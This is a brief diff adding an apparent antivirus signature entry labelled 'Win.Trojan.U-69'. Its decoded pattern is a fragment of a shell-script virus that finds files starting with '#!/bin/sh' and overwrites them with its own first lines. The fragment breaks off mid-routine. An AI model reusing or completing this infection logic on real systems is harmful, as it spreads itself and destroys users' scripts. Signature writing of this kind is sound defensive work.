@@ -1,0 +1,9 @@
+VIRUS NAME: Win.Trojan.U-69
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+
+  if [ "$(head -c9 $F 2>/dev/null)" = "#!/bin/sh" ]
+  then
+        HOST=$(cat $F|tr '\n' \xc7)
+        head -11 $0 > $F
